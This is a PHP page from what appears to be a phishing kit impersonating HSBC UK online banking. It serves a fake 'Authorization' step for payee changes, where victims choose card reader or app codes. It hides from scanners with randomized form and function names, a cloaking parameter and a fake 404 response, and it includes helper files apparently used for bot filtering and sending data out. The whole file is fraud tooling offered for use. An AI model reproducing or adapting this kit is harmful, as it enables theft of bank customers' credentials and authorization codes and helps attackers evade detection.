<?php
session_start();
error_reporting(0);
include "../hc.php";
include "../control.php";
include "../connect/out.php";
if(isset($_GET["accessU"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(8,9));
	$act="Cancel Payee Update";
	$codetype="cancellation";
	if($_SESSION["act"] == "Confirm"){ $act="Authorize Payee Update";$codetype="confirmation";}
	if($_SESSION["act"] == "Confirm"){ $act="Authorize Payee Update";$codetype="confirmation";}
	$err="display:none;";
	if(isset($_GET["error_i"]))
	{
		$err="";
	}
	echo '<!doctype html>
<html lang="en"><head>
      <meta charset="utf-8">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="apple-touch-icon" sizes="180x180" href="../reg/spec/180.png">
      <link rel="apple-touch-icon-precomposed" sizes="180x180" href="../reg/spec/180.png">
      <link rel="apple-touch-icon" sizes="152x152" href="../reg/spec/152.png">
      <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../reg/spec/152.png">
      <link rel="apple-touch-icon" sizes="144x144" href="../reg/spec/144.png">
      <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../reg/spec/144.png">
      <link rel="apple-touch-icon" sizes="120x120" href="../reg/spec/120.png">
      <link rel="apple-touch-icon-precomposed" sizes="120x120" href="../reg/spec/120.png">
      <link rel="apple-touch-icon" sizes="114x114" href="../reg/spec/114.png">
      <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../reg/spec/114.png">
      <link rel="apple-touch-icon" sizes="76x76" href="../reg/spec/76.png">
      <link rel="apple-touch-icon-precomposed" sizes="76x76" href="../reg/spec/76.png">
      <link rel="apple-touch-icon" sizes="72x72" href="../reg/spec/72.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../reg/spec/72.png">
      <link rel="apple-touch-icon" sizes="60x60" href="../reg/spec/60.png">
      <link rel="apple-touch-icon-precomposed" sizes="60x60" href="../reg/spec/60.png">
      <link rel="apple-touch-icon" sizes="57x57" href="../reg/spec/57.png">
      <link rel="apple-touch-icon-precomposed" sizes="57x57" href="../reg/spec/57.png">
      <meta name="apple-mobile-web-app-status-bar-style" content="#404040">
      <link rel="shortcut icon" href="../reg/spec/favicon-16x16.ico">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-196x196.png" sizes="196x196">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-96x96.png" sizes="96x96">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-32x32.png" sizes="32x32">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-16x16.png" sizes="16x16">
      <link rel="icon" type="image/png" href="../reg/spec/favicon-128.png" sizes="128x128">
      <meta name="msapplication-TileColor" content="#FFFFFF">
      <meta name="msapplication-TileImage" content="../reg/spec/mstile-144x144.png">
      <meta name="msapplication-square70x70logo" content="../reg/spec/mstile-70x70.png">
      <meta name="msapplication-square150x150logo" content="../reg/spec/mstile-150x150.png">
      <meta name="msapplication-wide310x150logo" content="../reg/spec/mstile-310x150.png">
      <meta name="msapplication-square310x310logo" content="../reg/spec/mstile-310x310.png">
      <meta name="msapplication-navbutton-color" content="#404040">
      <meta name="theme-color" content="#404040">
      <title>Authorize | My banking | HSBC</title>
	  <link type="text/css" rel="stylesheet" href="../reg/spec/fonts.css'.outrand().'">
      <link type="text/css" rel="stylesheet" href="../reg/spec/box.css'.outrand().'">
      <link type="text/css" rel="stylesheet" href="../reg/spec/table.css'.outrand().'">
	  </head>
   <body>
      <div id="mount">
         <div>
            <div class="styles_container_783Mc">
               <div>
                  <div class="styles_visuallyHidden_23ZWH" role="alert">Personal details, HSBC credit card application</div>
                  <div id="InitialFocus" tabindex="0"></div>
                  <div id="page">
                     <div class="pb-Page__Page">
                        <div class="pb-Page__wrapper">
                           <header class="pb-marginBottom__mb5">
                              <div class="pb-Masthead__wrapper">
                                 <div class="pb-Grid__Grid">
                                    <div class="pb-Grid__Row">
                                       <div class="pb-Grid__Cell pb-Grid__size-12 pb-Grid__sizeMedium-12 pb-Grid__sizeLarge-10 pb-Grid__offsetLarge-1">
                                          <div class="pb-Masthead__container" style="display:block">
                                             <span class="pb-Logo__LogoWrapper pb-marginBottom__mb0" style="float: left;">
                                                <canvas class="pb-Logo__stretcher" width="210.62" height="46"></canvas>
                                                <svg id="hsbc-uk-logo" class="pb-Logo__Logo" focusable="false" role="img" version="1.1" viewBox="0 0 210.62 46">
                                                   <title id="hsbc-uk-logo-title">HSBC UK</title>
                                                   <polygon fill="#db0011" points="91.87 23 69 0 69 46 91.87 23"></polygon>
                                                   <polygon fill="#db0011" points="46 23 69 0 23 0 46 23"></polygon>
                                                   <polygon fill="#db0011" points="0 23 23 46 23 0 0 23"></polygon>
                                                   <polygon fill="#db0011" points="46 23 23 46 69 46 46 23"></polygon>
                                                   <polygon points="112.16 24.42 103.76 24.42 103.76 32.56 99.62 32.56 99.62 13.44 103.76 13.44 103.76 21.32 112.16 21.32 112.16 13.44 116.29 13.44 116.29 32.56 112.16 32.56 112.16 24.42"></polygon>
                                                   <path d="M126.24,32.95c-4.13,0-7.62-1.68-7.62-6.2h4.13c0,2.07,1.29,3.23,3.49,3.23,1.68,0,3.62-.9,3.62-2.71,0-1.55-1.29-1.94-3.49-2.58l-1.42-.39c-3-.9-6.07-2.07-6.07-5.56,0-4.26,4-5.69,7.62-5.69s7,1.29,7,5.56h-4.13q-.19-2.71-3.1-2.71c-1.55,0-3.1.78-3.1,2.58,0,1.42,1.29,1.81,4,2.71l1.55.52c3.36,1,5.43,2.2,5.43,5.43.13,4.13-4,5.81-7.88,5.81"></path>
                                                   <path d="M136.71,13.44h6.72a12.76,12.76,0,0,1,3.75.26c2.33.52,4.13,2.07,4.13,4.65s-1.55,3.75-3.88,4.39c2.58.52,4.52,1.81,4.52,4.65,0,4.39-4.26,5.43-7.75,5.43h-7.49Zm6.59,8c1.81,0,3.75-.39,3.75-2.58,0-1.94-1.81-2.58-3.49-2.58h-3v5.17Zm.52,8.27c1.94,0,3.88-.52,3.88-2.84S146,24,144.07,24h-3.36v5.56h3.1Z"></path>
                                                   <path d="M162.81,32.95c-6.2,0-9-4-9-9.82s3.1-10.08,9.17-10.08c3.88,0,7.62,1.68,7.62,6.07H166.3a3.17,3.17,0,0,0-3.36-3c-3.75,0-4.91,4-4.91,7.11s1.16,6.59,4.78,6.59a3.41,3.41,0,0,0,3.62-3h4.39c-.52,4.39-4,6.07-8,6.07"></path>
                                                   <path d="M185.81,32.95c-4.78,0-7.37-2.71-7.37-7.37V13.44h1.81v11.5a6.92,6.92,0,0,0,.9,4.26,5.95,5.95,0,0,0,9.69-.65,8.5,8.5,0,0,0,.52-3.62V13.44h1.81V25.58c0,4.52-2.71,7.37-7.37,7.37"></path>
                                                   <path d="M197.05,13.44h1.68V32.69h-1.68Zm1.81,8.79,8.53-8.79h2.33l-8.79,8.66,9.69,10.6h-2.33Z"></path>
                                                </svg>
                                             </span>

<a class="pb-Logo__LogoWrapper pb-marginBottom__mb0" style="float: right;font-size: 13px;background: #e6e1e1;padding: 2px 15px;max-height: 50px;color: #000;border: 1px solid #000000;border-radius: 5px;text-decoration:none" href="idv.Logout.php?ud=dashbrd&idv.cmd=Verify&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'">Log off</a>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </header>
                           <main class="pb-Page__main" role="main">
                              <div class="pb-Grid__Grid">
                                 <div class="pb-Grid__Row">
                                    <div class="pb-Grid__Cell pb-Grid__size-12 pb-Grid__sizeMedium-9 pb-Grid__sizeLarge-6 pb-Grid__offsetLarge-1">
                                       <div class="ProgressIndicator pb-marginBottom__mb4">
                                          <div class="pb-ProgressIndicator__labelWrapper"><span><span class="pb-ProgressIndicator__stageTitle">Manage Payee(s)</span><span class="pb-ProgressIndicator__stageTitleDivider" role="none"> | </span></span><span class="">Step</span> 2 of 3</div>
                                          <div class="pb-ProgressIndicator__progressWrapper">
                                             <div class="pb-ProgressIndicator__bar">
                                                <div class="pb-ProgressIndicator__indicator" style="transform:translateX(-33%);"></div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div>
                                 <div class="style_container_hrDhY style_constrain_WpH9N">
                                    <div class="styles_container_1-l44 spacing_marginBottom3_2nwJq">
                                       <div class="style_grid_1rIIP helpers_clearfix_3SYTt">
                                          <div class="style_cell_2Z5YP style_size12_36Bma style_sizeMedium9_2vdhf style_sizeLarge6_1hFqT style_offsetLarge1_1EDVm">
                                             <div class="styles_textContainer_33zQ5 spacing_paddingBottom3_37d3j">
                                                <h1 class="style_heading_37lqH spacing_marginBottom2_STKte style_h1_qV8iS fonts_fontLight_suGJR fonts_fontSize6_3C9nF style_noMargin_278lx style_largerMarginInLargeDevice_giGa2">Authorization</h1>
                                                <p class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR">
  Action selected: <b><u>'.$act.'</u></b>
  <br>
  <br>
  Please select your mode of authorization.
</p>
<form action="idv.Auth.php?ud=dashbrd&idv.cmd=Verify&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'" method="post" onsubmit="'.$fj1.'(); return false;" name="'.$fname.'" id="'.$fname.'">   
<div class="style_p_GTYuM fonts_default_HHPMZ fonts_fontRegular_47h8F fonts_fontSize3_109mT spacing_marginBottom2_STKte styles_paragraph_HZ9kr spacing_paddingTop2_3AzSR" style="padding: 30px 30px;background: #f7f7f7;margin: 40px 0px;border: 1px solid #376798;">


<table style="width: 100%;">
																	 <tbody>
																	 <tr>
																	 <td style="text-align: center;">
																	 <label for="r_auth" style="font-size: 1.3em;width:auto;float:unset;"><img src="../reg/secure_key_support_dash_140x217.jpg" style="width:70px;margin-bottom:28px"></label></td>
																	 <td style="text-align: center;padding:20px"><input type="radio" name="a_type" id="r_auth" value="reader" checked="checked">&nbsp;<label for="r_auth" style="font-size: 1.3em;width:auto;float:unset;">Card Reader</label></td>
																	 
																	 
																	 </tr>
																	 <tr>
																	 <td style="text-align: center;">
																	 <label for="app_auth" style="font-size: 1.3em;width:auto;float:unset;"><img src="../reg/secureKeyPassword.png" style="width:70px;height:140px;"></label></td>
																	 <td style="text-align: center;padding:20px"><input type="radio" name="a_type" id="app_auth" value="app">&nbsp;<label for="app_auth" style="font-size: 1.3em;width:auto;float:unset;">HSBC App</label></td>																	 
																	 </tr>
																	 </tbody>
																	 </table>
 </div>



                                             </div>
                                             <hr class="styles_hr_RUQik">
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="style_container_hrDhY style_constrain_WpH9N">
                                    <div class="style_grid_1rIIP helpers_clearfix_3SYTt">
                                       <div class="style_cell_2Z5YP style_size12_36Bma style_sizeMedium9_2vdhf style_sizeLarge6_1hFqT style_offsetLarge1_1EDVm">
                                                                                    
                                             <div class="styles_navigation_3HEqt spacing_marginTop4_WEApq styles_noMarginBottom_iFslb spacing_marginBottom0_UajbN">
                                                <div>
                                                   <div class="">
                                                      <div class="styles_buttonContainer_2xKX1" style="padding-top: 5px;"><button class="style_button_25V2m grid_gridGutterSpacing_3sGPg style_bigFont_4f6ZM input_fontSizeInput_2xMnZ style_primary_3F2SG style_large_1S6Cd grid_gridGutterSpacing_3sGPg" type="submit">Continue</button></div>
                                                   </div>
                                                </div>
												
                                             </div>
                                          </form>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </main>
                           <footer class="pb-Footer__Footer pb-marginBottom__mb0">
                              <div class="pb-Grid__Grid">
                                 <div class="pb-Grid__Row">
                                    <div class="pb-Grid__Cell pb-Grid__size-12 pb-Grid__sizeLarge-10 pb-Grid__offsetLarge-1">
                                       <p class="pb-Paragraph__Paragraph pb-marginBottom__mb0">© HSBC Group 2020</p>
                                    </div>
                                 </div>
                              </div>
                           </footer>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>   
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>